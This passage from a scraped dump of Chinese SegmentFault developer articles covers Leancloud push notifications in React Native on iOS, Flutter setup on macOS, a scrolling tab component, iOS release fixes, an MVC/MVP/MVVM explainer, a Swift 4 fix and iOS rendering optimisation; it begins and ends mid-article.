    }
}

...

 _showAlert = (message) =&gt; {
    const MessageBarManager = require('react-native-message-bar').MessageBarManager;
    MessageBarManager.showAlert({
        title: '您有一条新的消息',
        message: message,
        alertType: 'success',
        stylesheetSuccess: {
            backgroundColor: '#7851B3', 
            titleColor: '#fff', 
            messageColor: '#fff'
        },
        viewTopInset : 20
    });
}

...</code></pre>
<p>最后重新运行App，然后在线发送一条通知，App打开状态下也能显示通知了：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015614730?w=848&amp;h=240"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<h3>收到通知显示Badge</h3>
<p>要实现badge显示并能随着通知个数递增非常简单，只需要在Leancloud控制台中勾选<code>Increment iOS badges</code>，然后发送通知后App图标上就会出现红色的badge了：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015614731?w=1868&amp;h=868"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015614732?w=844&amp;h=340"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<h4>清除badge</h4>
<p>添加badge之后，我们需要在合适的时间点再将其清除，Leancloud将每个设备上badge的数量也保存在_Installation表中，所以清除设备的badge同时需要修改Installation表：</p>
<pre><code>_iOS_cleanBadge = () =&gt; {
    Installation.getCurrent()
        .then((installation) =&gt; {
            installation.set('badge', 0);
            return installation.save();
        })
        .then((result) =&gt; {
            PushNotificationIOS.setApplicationIconBadgeNumber(0);
        })
        .catch(error =&gt; console.log(error));
}</code></pre>
<h3>自定义点击通知的行为</h3>
<p>点击通知又分为点击iOS系统弹出的通知提醒和点击我们自定义的MessageBar。而点击iOS系统的通知又可分为App在后台运行和App处于关闭状态。接下来我们就分别讨论这三种状态下如何处理：</p>
<h4>1. App打开，点击MessageBar</h4>
<p>react-native-message-bar提供了<code>onTapped</code>的callback，所以我们只需要传入我们想要执行的方法就行了，我们将PushService进行如下修改：</p>
<pre><code>...

_iOS_onNotificationTapped = () =&gt; {
    Alert.alert('Notification Tapped');
}

_showAlert = (message) =&gt; {
    const MessageBarManager = require('react-native-message-bar').MessageBarManager;
    MessageBarManager.showAlert({
        ...
        onTapped: this._iOS_onNotificationTapped
    });
}

...</code></pre>
<h4>2. App在后台运行，点击系统通知</h4>
<p>实现思路是，当app在后台运行时收到通知，点击通知会触发<code>notification</code>事件，我们用一个临时变量记录下当前的通知，再通过监听app状态的变化，当app从后台切换到前台后临时变量是否有值判断是否是点击通知打开的app，如果是通过点击通知打开app，执行我们想要的逻辑。说的有点绕，让我们来看代码：</p>
<pre><code>...

class PushService {

    //用于记录通知的临时变量
    backgroundNotification = null;
    
    _iOS_initPush = () =&gt; {
        ...
        
        //监听app状态的改变
        AppState.addEventListener('change', (newState) =&gt; {
            if (newState === 'active') {
                if (this.backgroundNotification != null) {
                    this._iOS_onNotificationTapped();
                    this.backgroundNotification = null;
                    this._iOS_cleanBadge();
                }
            }
        });
    }
    
    ...
    
    _iOS_onNotification = (notification) =&gt; {
        ...
        
        } else if (AppState.currentState === 'background') { 
            //app在后台运行时点击通知
            this.backgroundNotification = notification;
        }
    }
    
    ...
    </code></pre>
<h4>3. App关闭状态下，点击系统通知</h4>
<p>直接调用<code>PushNotificationIOS.getInitialNotification</code>判断app关闭时，是否通过点击系统消息打开：</p>
<pre><code>...

_iOS_initPush = () =&gt; {
    ...
    
    //app关闭时，是否通过点击系统通知打开
    PushNotificationIOS.getInitialNotification()
        .then((notification) =&gt; {
            if (notification) {
                this._iOS_onNotificationTapped();
            }
        });
}

...</code></pre>
<h1>结语</h1>
<p>至此，使用Leancloud实现iOS的消息推送已实现完成，并涵盖了主要的应用场景。出于控制篇幅的原因，Android的实现单独写了一篇文章分享给大家：</p>
<p>Android篇地址：<a href=""https://segmentfault.com/a/1190000015629540"" rel=""nofollow noreferrer"">使用Leancloud实现React Native App的消息推送（Push Notification）- Android篇</a></p>
<p>本文Demo Github地址：<a href=""https://github.com/MudOnTire/LeancloudPushDemo"" rel=""nofollow noreferrer"">https://github.com/MudOnTire/LeancloudPushDemo</a>，如果对你有帮助，star一下吧。</p>

                ", 使用Leancloud实现React Native App的消息推送（Push Notification）-  iOS篇,1531971853,260,1,577,1,1,https://segmentfault.com/a/1190000015614719
4,1,0,6,"
                    
<h1>相关软件安装</h1>
<h2>JDK安装</h2>
<ul><li><h3>下载</h3></li></ul>
<p>前往下载页面下载安装包：<a href=""http://www.oracle.com/technetwork/java/javase/downloads/index.html"" rel=""nofollow noreferrer"">http://www.oracle.com/technet...</a></p>
<blockquote>下载8.x的版本，8以上的会出问题</blockquote>
<ul><li><h3>安装</h3></li></ul>
<p>双击安装包，一路下一步至完成</p>
<ul><li><h3>配置</h3></li></ul>
<p>找到jdk安装路径，一版情况为：/Library/Java/JavaVirtualMachines/jdk-8.jdk/Contents/Home</p>
<p>也可以打开访达，选择菜单【前往】-【电脑】，随后进入路径【Macintosh HD】-【资源库】中看是否存在Java文件夹，然后找寻安装路径;</p>
<p>检查用户文件夹下是否存在.bash_profile文件，不存在则创建;</p>
<p>将如下代码添加到.bash_profile文件中</p>
<pre><code class=""bash"">JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-10.0.1.jdk/Contents/Home
PATH=$JAVA_HOME/bin:$PATH:.
CLASSPATH=$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib/dt.jar:.
export JAVA_HOME
export PATH
export CLASSPATH</code></pre>
<p>在终端输入如下命令是配置生效</p>
<pre><code class=""bash"">source ~/.bash_profile</code></pre>
<p>输入如下命令检测是否配置成功，如果成功将输出配置的路径</p>
<pre><code class=""bash"">echo $JAVA_HOME</code></pre>
<h2>Android Studio安装</h2>
<ul><li><h3>下载</h3></li></ul>
<p>前往下载页面下载安装包：<a href=""https://developer.android.com/studio/"" rel=""nofollow noreferrer"">https://developer.android.com...</a> <br>或者直接点击下载<a href=""https://dl.google.com/dl/android/studio/install/3.1.3.0/android-studio-ide-173.4819257-mac.dmg"" rel=""nofollow noreferrer"">Android Studio v3.1.3</a><br>请在官网下载，避免出现<a href=""https://www.zhihu.com/question/35721299"" rel=""nofollow noreferrer"">XcodeGhost</a>类似问题</p>
<ul><li><h3>安装</h3></li></ul>
<p>双击安装包，将应用拖拽到【应用程序】中，完成安装。</p>
<ul><li><h3>配置</h3></li></ul>
<p>安装完成后打开Android Studio应用;<br>第一次打开会询问是否导入设置，按照需求选择，我是第一使用，我选择第二项;<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015560049?w=523&amp;h=176"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<p>第一次使用会弹出无法访问Android SDK，暂时点Cancel；</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015560050"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<p>随后界面一路蓝色按钮点击即可。</p>
<p>最后一步是下载相关资源，下载结束后即可进入Android Studio了。</p>
<p>在.bash_profile中放入下列代码</p>
<pre><code class=""bash"">export ANDROID_HOME=/Users/mingyu/Library/Android/sdk
export PATH=${PATH}:${ANDROID_HOME}/tools
export PATH=${PATH}:${ANDROID_HOME}/platform-tools</code></pre>
<p>还要安装插件，打开Android Studio，在【首页】-【Configure】-【Plugins】中所有插件Flutter和Dart进行安装；</p>
<h2>Xcode安装</h2>
<p>直接在App Store中搜索Xcode进行安装</p>
<h2>VSCode安装</h2>
<p>开发IDE，直接去<a href=""https://code.visualstudio.com/"" rel=""nofollow noreferrer"">官网下载</a>，下载安装后，需要安装两个扩展：Dart和Flutter，直接在扩展中搜索安装即可。</p>
<h2>Brew安装</h2>
<p>包管理工具，flutter必须的一些包需要用它来安装；</p>
<p>前往<a href=""https://brew.sh/index_zh-cn"" rel=""nofollow noreferrer"">官方网站</a>，按照上面最新的提示进行安装；<br>安装好后，可以选择使用国内镜像，打开终端，执行下列命令：</p>
<pre><code class=""bash""># 参考文档：https://mirror.tuna.tsinghua.edu.cn/help/homebrew/

cd /usr/local/Homebrew

git remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git

cd /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core

git remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git

brew update
# update 时间较长，耐心等待</code></pre>
<h2>Flutter安装</h2>
<ul><li><h2>下载</h2></li></ul>
<p>执行下列命令下载最新的flutter代码（系统请先安装Git）</p>
<pre><code class=""bash"">git clone -b beta https://github.com/flutter/flutter.git</code></pre>
<ul><li><h2>安装&amp;配置</h2></li></ul>
<p>在用户文件夹下找到.bash_profile文件，如果没有就创建一个;</p>
<p>在文件中加入如下代码：</p>
<pre><code class=""bash"">export PUB_HOSTED_URL=https://pub.flutter-io.cn # 国内用户需要设置
export FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn # 国内用户需要设置
export PATH={Fluter代码存放目录}/bin:$PATH</code></pre>
<p>添加保存后，执行下列命令刷新终端：</p>
<pre><code class=""bash"">source $HOME/.bash_profile</code></pre>
<p>运行下列命令检查flutter是否已经安装成功：</p>
<pre><code class=""bash"">flutter -v</code></pre>
<p>第一次运行会安装一些东西，然后显示欢迎提示，告知已经安装成功；</p>
<p>接下来需要运行下列命令检查flutter的依赖项：</p>
<pre><code class=""bash"">flutter doctor</code></pre>
<p>运行该命令后，flutter会提示你那些东西是必须要的，需要执行什么命令进行安装，按照提示安装即可；</p>
<p>其中必要的一项，请创一个虚拟Android虚拟设备，并保持开机状态。</p>
<h1>第一个Flutter App</h1>
<p>打开VSCode，按F1(有touchbar的机子按住fn可见F1)呼出命令输入框；</p>
<p>输入字符Flutter，在命令候选列表中选择<code>Flutter: New Project</code>，新建一个Flutter项目，随后让你填写项目名称和选择项目存放路径；</p>
<p>项目创建好后，在VSCode右下角选择调试环境目标:<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015560051"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<p>按F5运行项目；</p>
<p>这里我遇到了报错有关于gradle的，解决方案是删除用户文件夹下的.gradle文件夹，然后使用brew重新安装gradle；<br>gradle安装参考：<a href=""https://gradle.org/"" rel=""nofollow noreferrer"">https://gradle.org/</a></p>
<p>不报错的情况下，VSCode会下载一些必要资源，然后在目标设备（右下角选择的）上运行app；<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015560052"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image"" title=""image""></span></p>
<p><strong>至此，Flutter安装完毕，正常运行！接下来就是Flutter开发之旅了~~</strong></p>

                ", Mac下安装Flutter，并创建第一个App,1531971855,156,1,320,1,1,https://segmentfault.com/a/1190000015560046
5,1,0,6,"
                    
<p>在APP中免不了要使用tab组件,有的是tab切换,也有的是tab分类切换.</p>
<p>这些组件分成下面两种.<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015551667?w=338&amp;h=69"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br><span class=""img-wrap""><img data-src=""/img/remote/1460000015551668"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>第一种非常简单,同时大多数第三方组件都能达到效果.这里重点讲述第二种,我们要让第二种组件不仅能左右滑动,同时还能够在点击的时候自动滑动,将点击的位置滑动到正中间.</p>
<h2>准备</h2>
<p>我们先来分析一波.一个滑动组件在APP上是一种什么状态.<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015551669"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>这里可以看出,tab组件需要考虑到长度超过APP的屏幕,并且在超过之后能够滑动.</p>
<p>同时计算出当前位置需要滑动多少距离才能够将位置居中.<br><code>需要滑动的位置=点击位置的左边距-APP屏幕/2+点击位置的宽度/2</code></p>
<p>这个公式也就是我们自动滑动的核心了.</p>
<h2>开发</h2>
<p>使用<code>ScrollView</code>组件承载tab项,这样就可以非常简单的达到滑动的效果.同时添加<code>horizontal</code>、<code>directionalLockEnabled</code>、<code>showsHorizontalScrollIndicator</code>、<code>snapToAlignment</code>几个属性.</p>
<pre><code class=""javascript"">&lt;ScrollView ref={e =&gt; this.scroll = e}
    horizontal directionalLockEnabled
    showsHorizontalScrollIndicator={false}
    snapToAlignment=""center""&gt;
    {this.props.data.map((item, index) =&gt;
        {/*具体项*/}
    )}
&lt;/ScrollView&gt;</code></pre>
<p>使用<code>TouchableOpacity</code>包裹内容项,同时调用<code>setLaout</code>方法将每个项的宽高等属性记录下来,为我们后面计算当前位置做准备.</p>
<pre><code class=""javascript"">&lt;TouchableOpacity onPress={() =&gt; this.setIndex(index)} 
    onLayout={e =&gt; this.setLaout(e.nativeEvent.layout, index)} 
    key={item.id} 
    style={tabBarStyle.itemBtn}&gt;
        &lt;Text style={[tabBarStyle.item, this.state.index === index ? tabBarStyle.active : null]} &gt; {item.name}&lt;/Text&gt;
        &lt;View style={[tabBarStyle.line, this.state.index === index ? tabBarStyle.active2 : null]}&gt;             &lt;/View&gt;
&lt;/TouchableOpacity&gt;</code></pre>
<p>记录每个项渲染之后的位置,将这些值存在变量里,为后面计算做准备.</p>
<pre><code class=""javascript"">laout_list = []
setLaout(layout, index) {
    //存单个项的位置
    this.laout_list[index] = layout;
    //计算所有项的总长度
    this.scrollW += layout.width;
}</code></pre>
<p>接下来就是点击自动变换位置的计算了.</p>
<pre><code>setIndex(index, bl = true) {
    //先改变点击项的颜色
    this.setState({ index })
    //兼容错误
    if (!this.scroll) return;
    //拿到当前项的位置数据
    let layout = this.laout_list[index];
    let rx = deviceWidth / 2;
    //公式
    let sx = layout.x - rx + layout.width / 2;
    //如果还不需要移动,原地待着
    if (sx &lt; 0) sx = 0;
    //移动位置
    sx &lt; this.scrollW - deviceWidth &amp;&amp; this.scroll.scrollTo({ x: sx, animated: bl });
    //结尾部分直接移动到底
    sx &gt;= this.scrollW - deviceWidth &amp;&amp; this.scroll.scrollToEnd({ animated: bl });
    //触发一些需要的外部事件
    this.props.onChange &amp;&amp; this.props.onChange(index);
}</code></pre>
<p>最后上一张结果图:<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015551670"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><a href=""https://gitee.com/cuo9958/react-native-tabs"" rel=""nofollow noreferrer"">gitee地址</a></p>
<p><a href=""https://github.com/cuo9958/react-native-tabs-top"" rel=""nofollow noreferrer"">github地址</a></p>

                ", react-native动态姿态tab组件,1531971856,454,1,190,1,1,https://segmentfault.com/a/1190000015551664
6,1,0,6,"
                    
<h2>问题列表</h2>
<h3>ios distribution certificate but private key is not installed</h3>
<blockquote><a href=""https://blog.csdn.net/yishengzhiai005/article/details/78630768"" rel=""nofollow noreferrer"">https://blog.csdn.net/yisheng...</a></blockquote>
<h3>Alamofire.framework contains unsupported architectures '[x86_64, i386]'.</h3>
<blockquote><a href=""https://github.com/Alamofire/Alamofire/issues/1662"" rel=""nofollow noreferrer"">https://github.com/Alamofire/...</a></blockquote>
<h3>Failed to verify bitcode in Alamofire.framework/Alamofire:</h3>
<ul><li>方案一： 禁用 bitcode</li></ul>
<p>选中项目 targets &gt; build settings &gt; bitcode &gt; no</p>
<ul><li>方案二：可能是Carthage的配置不当 参见：<a href=""https://github.com/Carthage/Carthage/blob/master/README.md"" rel=""nofollow noreferrer"">https://github.com/Carthage/C...</a> 配置 8 - 10 步操作</li></ul>
<h3>iOS模拟器截iPAD 屏幕</h3>
<blockquote>Uncheck ""Optimize Rendering for Window Scale"" option from ""Debug"" menu. Then take your screenshot(Cmnd + S) with zoom. Now it will be in size 1242 x 2208</blockquote>

                ", iOS发布问题解决,1531971858,472,1,724,1,1,https://segmentfault.com/a/1190000015345701
7,1,0,6,"
                    
<blockquote>
<p>架构模式的文章很多，好理解的没有几个。大部分文章出现的主要问题有：</p>
<ul>
<li>没有设定好作用域：前端MVC是改造过的MVC，和后台MVC有明显的区别，不能一概而论</li>
<li>没有实际的例子：实际的例子对应日常的工作，没有就很难产生共鸣，从而造成看一次忘一次的困扰。</li>
<li>没有明确的目的：理解架构模式的真正意义是什么？虚拟DOM和组件化在MV*中的位置？</li>
</ul>
<p>题目开的太大，一定有很多疏忽错误的地方，也恳请大家指出。</p>
</blockquote>
<h1>1. MV*</h1>
<h2>1.1 后端MVC与前端MVC</h2>
<p>从实现上来说，主要可以分为后端MVC和前端MVC两种。这两种MVC的不同点如下：<br><span class=""img-wrap""><img data-src=""/img/bVbcnl7?w=1123&amp;h=793"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""作者来源我暂时找不到了，找到了后补上"" title=""作者来源我暂时找不到了，找到了后补上""></span></p>
<p>可以看到，<strong>前端的MVC其实是为了解决前端复杂JS模块化的问题，从后端MVC的V分出来的MVC</strong>，与后端MVC并没有直接的关系。<strong>前端的MVC中，M占的比例很低，只指代数据。而后端V的比例很低，只有模版的部分。</strong></p>
<h2>1.2 MVC/MVP/MVVM</h2>
<p><span class=""img-wrap""><img data-src=""/img/bVbco2r?w=684&amp;h=282"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>可以清晰的看出，这三个架构的区别在“<strong>M与V联系</strong>”的部分。下面我们针对这一部分做一个对比：</p>
<ul><li>
<strong>Controller</strong>: 负责监听View的用户事件，得到数据后Controller做一些处理，然后渲染View。</li></ul>
<blockquote>当然，在一些后端MVC架构里，Model也可以直接渲染View模版，但这只是不同变种的实现，这里不多做讨论。</blockquote>
<p>但是随时逻辑的复杂，这样的处理遇到了很难调试的问题。由于View一定要运行在UI环境下，而且Model或者Controller和View强耦合，没有办法单独验证应用逻辑的正确性。当出了问题之后，因为各个模块是耦合在一起的，也不能快速判断究竟是哪个模块出现的问题。因此，MVP模式出现了。</p>
<ul><li>
<p><strong>Presenter</strong>: 比起Controller，Presenter会调用View层提供的接口去渲染Model。这样做有几点好处：</p>
<ul>
<li>面向接口编程</li>
<li>更好的解耦</li>
<li>方便做单元测试</li>
</ul>
</li></ul>
<p>现在P和V解耦了，P可以自己做单元测试了。软件结构划分的更加清楚，逻辑清晰并方便调试。但是这一切都来自于一个前提：View层要提供接口。当一个UI复杂起来的时候，View层需要提供的接口是很多的，这本身也是一种开发调试的成本。所以，MVVM应运而生。</p>
<ul><li>
<strong>ViewModel</strong>: 比起MVP中View需要自己提供API，MVVM在VM中构建一组状态数据（state data），作为View状态的抽象。然后通过双向数据绑定（data binding）使VM中的状态数据（state data）与View中的显示状态（screen state）保持一致。这样，VM中的展示逻辑只需要修改对应的状态数据，就可以控制View的状态，从而避免在View上开发大量的接口。</li></ul>
<p>VM有没有什么缺点？有的，当UI比较简单的时候，使用VM就会使业务逻辑变得复杂，有过分设计的嫌疑。所以VM只适合复杂UI交互的项目。</p>
<h1>2. 举个栗子</h1>
<p>栗子🌰：现在用户下拉刷新一个页面，页面上出现10条新的新闻，新闻总数从10条变成20条。那么MVC、MVP、MVVM的处理依次是：</p>
<pre><code>1. View获取下拉事件，通知Controller
2. Controller向后台Model发起请求，请求内容为下拉刷新
3. Model获得10条新闻数据，传递给Controller
4. Controller拿到10条新闻数据，可能做一些数据处理，然后拿处理好的数据渲染View
    MVC: 拿到UI节点，渲染10条新闻
    MVP: 通过View提供的接口渲染10条新闻
    MVVM: 无需操作，只要VM的数据变化，通过数据双向绑定，View直接变化</code></pre>
<h1>3. 了解架构的意义</h1>
<p>最大的意义是<strong>站在创造者的角度上去思考问题</strong>，他们为什么要这么设计，这样做又有什么样的好处。当然，也有助于我们理解其他相关的知识。等到未来的某一天，当我们遇到更复杂的情况，用今天的MVVM也不能解决的时候，就可以顺着这样的思考脉络，重新进行架构设计，散发出自己的光。</p>
<p><strong>备注：虚拟DOM与组件化</strong><br>不管是虚拟DOM也好，还是组件化也罢，都是一种开发策略，而不是架构模式上考虑的问题。换句话说，它们与MV*是两个维度上的事情。所以把虚拟DOM和组件化扯入到MVC，MVP，MVVM的差异中并没有意义。</p>
<h1>参考文献</h1>
<ol>
<li>《<a href=""http://wzhscript.com/2015/02/03/mvc-mvp-and-mvvm/"" rel=""nofollow noreferrer"">浅析 MVC, MVP 与 MVVM之间的异同</a>》</li>
<li>《<a href=""http://grahamle.github.io/2013/12/%E5%89%8D%E5%90%8E%E7%AB%AFMVC%E6%80%9D%E8%80%83/"" rel=""nofollow noreferrer"">前后端MVC的思考</a>》</li>
</ol>

                ", 一篇文章了解架构模式：MVC/MVP/MVVM,1531971860,232,1,278,1,1,https://segmentfault.com/a/1190000015310674
8,1,0,6,"
                    
<p><a href=""https://github.com/nickoneill/PermissionScope"" rel=""nofollow noreferrer"">PermissionScope</a>是iOS非常好用的权限处理库，界面效果也非常精美。不幸的是作者已经停止维护。</p>
<blockquote>PermissionScope is no longer supported. Please use an alternative if you need updates for newer iOS 10 and 11 APIs!</blockquote>
<h2>问题的来源</h2>
<p>因为作者是基于Swift3开发的，而4.0的<code>@selector</code>语法有一点调整，所以是不能通过编译的，处理办法是根据Xcode的提示一个个修正。</p>
<p>可是事情真的这么简单吗？Xcode处理过后虽然编译通过了，但是会触发运行时错误。错误内容大致是<code>调用了不存在的方法</code>。</p>
<h2>解决方案</h2>
<p>由于我们根据Xcode的提示给相关代码加了<code>@objc</code>，但是有些方法是没有加的，而这些方法类似下面的代码：</p>
<pre><code class=""swift"">func requestCamera() {

}</code></pre>
<p>由于没有<code>@objc</code>修饰，<code>@selector</code>指令找不到方法，所以就报错了。解决方案如下：</p>
<pre><code class=""swift"">@objc
func requestCamera() {

}</code></pre>

                ", PermissionScope Swift4 兼容问题,1531971861,262,1,161,1,1,https://segmentfault.com/a/1190000015294225
9,1,0,6,"
                    
<p><a href=""https://www.dandj.top/2018/07/05/iOS%E6%98%BE%E7%A4%BA%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E8%BF%87%E7%A8%8B%E8%AE%B2%E8%A7%A3/"" rel=""nofollow noreferrer"">点我跳转原文地址</a></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000015030566"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""logo.png"" title=""logo.png""></span></p>
<h2>卡顿的原理</h2>
<p>iOS系统界面滑动流畅性的保持主要是依靠CPU和GPU两大处理硬件间通力合作的结果，一个视图的显示需要先经过CPU创建、布局计算、对图片解码、文本绘制，然后CPU将计算的结果交给GPU，GPU可能需要对图形进行变换、合成、渲染，GPU然后将渲染的结果提交到帧缓冲区等待下一次的垂直同步信号（V-Sync）到来显示到显示器上，如果在一个V-Sync间隔内CPU或者GPU由于过高的利用率都可能导致数据的不及时提交，那么那一帧数据就会被丢弃，等待下一次的V-Sync再显示，这也就是通常能感受到的界面卡顿现象，也就是掉帧。</p>
<h2>优化过程</h2>
<p>所以当出现卡顿现象时主要去分析此刻CPU和GPU的利用率，当出现较高的CPU利用率时应及时去分析代码执行的效率，或者用Time Profier去分析导致较高占用率的代码，更多详细的关于优化CPU的情况本文不做详细分析。<br>而对于GPU资源消耗的优化本文将通过一个Demo优化过程来讲解优化的步骤，你可以在<a href=""https://github.com/dangercheng/iOS_skill_demos/tree/master/GraphicsPerformanceOptimization"" rel=""nofollow noreferrer"">这里GitHub</a>下载源码，Demo是有2个tab组成的，before是优化前视图，after是优化后的，你可以通过对比学习体会其中的差异。<br>下载运行demo, 打开Xcode的调试选项，在菜单栏-Debug-View Debugging-Rendering可以找到，运行APP(真机)勾选相关的菜单选项即可<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030567"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Rendering.png"" title=""Rendering.png""></span></p>
<h3>1.视图混合(Blending)</h3>
<p>app中显示的效果往往是多个视图重合叠加的效果，而在计算视图重合显示颜色的时候就需要考虑透明的影响，当顶部视图出现透明的情况时，颜色的计算就需要考虑其透明度，这样无疑增加了计算成本，消耗GPU资源，所以应尽量避免过多的透明视图数量。<br>对于UIImageView而言，如果图片本身是带有透明通道的同样会导致Blending，所以应该尽量避免使用带有透明度的图片。<br>对于文本UILable, 如果不设置背景颜色，同样会出现Blending，所以需要设置UILabel的背景颜色，对于显示中文的UILabel, 除了设置背景颜色外还需要设置masksToBounds属性，因为中文时UILable会多了一个sublayer。<br>勾选Rendering中的第一个选项Color Blended Layers，此选项就是用于检测哪些视图出现了Blending，出现Blending的地方会用红色标记出来，运行demo可以出现下图所示情况：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030568"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Blending.png"" title=""Blending.png""></span></p>
<p>可以看到，before tab下的控制器视图无论是图片还是文本都被标红，表示出现了Blending，对于图片我们可以在Assets里面找到对应的图片，然后查看简介就可以查看图片是否有Alpha通道，会看到图片都具有Alpha通道，也就回导致Blending<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030569"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Alpha通道.png"" title=""Alpha通道.png""></span><br>对于这种情况，可以让UI切图时关闭此Alpha通道，也可以直接用mac自带的图片软件打开图片，然后导出图片关闭Alpha通道。所以我们需要将所有有Alpha的图片都处理一遍，尽量不要使用带有透明度的图片。<br>对于UILabel，上面有提到，我们只需要下面的2行代码即可处理：</p>
<pre><code>titleLabel.backgroundColor = UIColor.white
titleLabel.layer.masksToBounds = true
</code></pre>
<p>通过去掉图片alpha通道优化后如下图所示，只有被设置为圆角的小图片还存在Blending，因为我们是直接设置的layer的cornerRadius(IOS9以下会导致离屏渲染)，同样我们可以直接用无透明通道的圆角图片来替换解决，但这需要UI适配更多背景图片。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030570"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Blending优化后.png"" title=""Blending优化后.png""></span></p>
<h3>2.光栅化</h3>
<p>开启光栅化是通过设置属性shouldRasterize，开启光栅化后CALayer会被保存为bitmap放到缓存中，这样在下次需要时可以直接中缓存中取出来显示，这样节省了渲染时间，例如对于设置有阴影效果的复杂视图会对性能有一定的提升。</p>
<pre><code>nameLabel.layer.shouldRasterize = true//开启光栅化</code></pre>
<p>第二个调试选项 Color Hits Green and Misses Red就是用来查看光栅化视图的，勾选后若视图被标记为绿色，则表示命中了缓存，直接从缓存中取出来显示，缓存的有效时间为100ms, 而红色则表示没有命中。Demo中，我们对第2个Label开启了光栅化，滚动会发现被标记为绿色<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030571"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""光栅化.png"" title=""光栅化.png""></span></p>
<p>更新一个已光栅化的Layer会触发离屏渲染，所以选择哪些视图适合做光栅化需要根据场景权衡，光栅化适合那些布局复杂而不经常变动的视图，比如</p>
<ul>
<li>用于避免静态内容的复杂特效的重绘,例如UIBlurEffect</li>
<li>用于避免多个View嵌套的复杂View的重绘。</li>
</ul>
<p>同时注意缓存是有大小限制的，所以不要过度是使用光栅化，因为超过缓存大小会导致大量的离屏渲染。</p>
<h3>3.颜色格式</h3>
<p>Color Copied Images选项能标识出视图中不能被GPU处理的图片，因为来自网络的图片格式可能千变万化，有的图片的格式是GPU无法识别的所以会交给CPU处理，出现这种情况就需要修改图片格式，</p>
<h3>4.不标准的表面颜色格式</h3>
<p>Color Non-Standard Surface Formats 打开此选项后会发现Label会出现灰色的背景颜色，然后经过我们给Label设置了背景颜色后便消失了，关于此选项的相关介绍甚少，期待有人能挖掘挖掘，所以只能猜测，苹果推荐我们给Label设置一个背景颜色。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030572"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Non-Standard.png"" title=""Non-Standard.png""></span></p>
<h3>5.颜色刷新频率</h3>
<p>默认情况下图层的颜色更新是有10ms的延迟的，在某些特定情况下可能需要关闭这个延迟，但绝大多数情况用不到这个选项。</p>
<h3>6.图片大小</h3>
<p>Color Misaligned Images选项在图片像素不对齐（也就是图片带alpha通道）时，会在图片上面加一层洋红色来标识；而图片被缩放时，会加一层黄色来标识，我们可以看到优化前的图片会出现图片缩放，因为图片的显示大小和图片的大小不匹配。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030573"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Misaligned.png"" title=""Misaligned.png""></span><br>图片缩放同样会消耗GPU资源，所以尽量保证图片的显示大小和原图大小一致来避免缩放，所以demo的图片在处理后大小都等于显示的大小来避免缩放。</p>
<h3>7.离屏渲染</h3>
